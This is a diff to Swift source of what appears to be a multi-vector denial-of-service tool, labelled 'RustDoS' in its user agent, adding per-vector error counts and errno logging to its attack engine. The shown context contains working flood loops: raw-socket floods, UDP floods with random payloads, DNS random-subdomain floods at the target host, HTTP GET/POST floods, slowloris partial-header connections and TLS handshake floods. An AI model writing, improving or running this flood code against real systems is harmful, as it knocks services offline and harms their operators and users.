@@ -19,6 +19,8 @@ final class RunState: @unchecked Sendable {
     private let lock = NSLock()
     private var snap = Snapshot()
     private var stopped = false
+    private var errorCounts = [UInt64](repeating: 0, count: Vector.allCases.count)
+    private var lastErrno = [Int32](repeating: 0, count: Vector.allCases.count)
 
     private(set) var rawAvailable = true
 
@@ -32,9 +34,11 @@ final class RunState: @unchecked Sendable {
         stopped = true
     }
 
-    func markRawUnavailable() {
+    func markRawUnavailable(_ v: Vector, _ code: Int32) {
         lock.lock(); defer { lock.unlock() }
         rawAvailable = false
+        lastErrno[v.order] = code
+        Log.error("raw", "\(v.name): raw socket failed, \(errnoText(code))")
     }
 
     func hit(_ v: Vector, _ n: Int) {
@@ -43,9 +47,22 @@ final class RunState: @unchecked Sendable {
         snap.bytes[v.order] += UInt64(n)
     }
 
-    func error() {
+    func error(_ v: Vector, _ code: Int32) {
         lock.lock(); defer { lock.unlock() }
         snap.errors += 1
+        errorCounts[v.order] += 1
+        lastErrno[v.order] = code
+    }
+
+    /// Per-vector error deltas since the last call, for the once-a-second log.
+    func drainErrors() -> [(Vector, UInt64, Int32)] {
+        lock.lock(); defer { lock.unlock() }
+        var out: [(Vector, UInt64, Int32)] = []
+        for v in Vector.allCases where errorCounts[v.order] > 0 {
+            out.append((v, errorCounts[v.order], lastErrno[v.order]))
+            errorCounts[v.order] = 0
+        }
+        return out
     }
 
     func snapshot() -> Snapshot {
@@ -86,7 +103,7 @@ enum Engine {
     private static func rawWorker(_ state: RunState, _ v: Vector, target: Target, port: UInt16) {
         guard let dstIP = target.primary else { return }
         guard let fd = Net.rawSocket(v.proto) else {
-            state.markRawUnavailable()
+            state.markRawUnavailable(v, errno)
             return
         }
         defer { close(fd) }
@@ -125,7 +142,7 @@ enum Engine {
                 if Net.sendTo(fd, frame, dstIP, port) > 0 {
                     state.hit(v, frame.count)
                 } else {
-                    state.error()
+                    state.error(v, errno)
                 }
             }
             Thread.sleep(forTimeInterval: pause)
@@ -149,30 +166,36 @@ enum Engine {
                     state.hit(v, 0)
                     close(fd)
                 } else {
-                    state.error()
+                    state.error(v, errno)
                 }
             }
         case .udpFlood:
-            guard let fd = Net.udpSocket() else { return }
+            guard let fd = Net.udpSocket() else {
+                state.error(v, errno)
+                return
+            }
             defer { close(fd) }
             while state.running {
                 let payload = randomBytes(1200)
                 let n = Net.sendTo(fd, payload, ip, port)
-                if n > 0 { state.hit(v, n) } else { state.error() }
+                if n > 0 { state.hit(v, n) } else { state.error(v, errno) }
             }
         case .dnsFlood:
-            guard let fd = Net.udpSocket() else { return }
+            guard let fd = Net.udpSocket() else {
+                state.error(v, errno)
+                return
+            }
             defer { close(fd) }
             while state.running {
                 let label = String((0..<Int.random(in: 6..<14)).map { _ in Character(UnicodeScalar(UInt8.random(in: 97...122))) })
                 let q = dnsQuery("\(label).\(target.host)")
                 let n = Net.sendTo(fd, q, ip, port)
-                if n > 0 { state.hit(v, n) } else { state.error() }
+                if n > 0 { state.hit(v, n) } else { state.error(v, errno) }
             }
         case .httpGet, .httpPost:
             while state.running {
                 guard let fd = Net.connect(ip, port) else {
-                    state.error()
+                    state.error(v, errno)
                     continue
                 }
                 Net.setRecvTimeout(fd, ms: 250)
@@ -195,19 +218,19 @@ enum Engine {
                         Thread.sleep(forTimeInterval: Double.random(in: 0.04...0.16))
                     }
                 } else {
-                    state.error()
+                    state.error(v, errno)
                 }
                 close(fd)
             }
         case .slowloris:
             while state.running {
                 guard let fd = Net.connect(ip, port) else {
-                    state.error()
+                    state.error(v, errno)
                     continue
                 }
                 let head = "GET / HTTP/1.1\r\nHost: \(target.host)\r\nUser-Agent: RustDoS\r\nX-Pad: \(String(repeating: "a", count: 64))\r\n"
                 if !Net.write(fd, Array(head.utf8)) {
-                    state.error()
+                    state.error(v, errno)
                     close(fd)
                     continue
                 }
@@ -225,7 +248,7 @@ enum Engine {
                 if tlsHandshake(host: target.host, ip: ip, port: port) {
                     state.hit(v, 517)
                 } else {
-                    state.error()
+                    state.error(v, 0)
                 }
             }
         default:
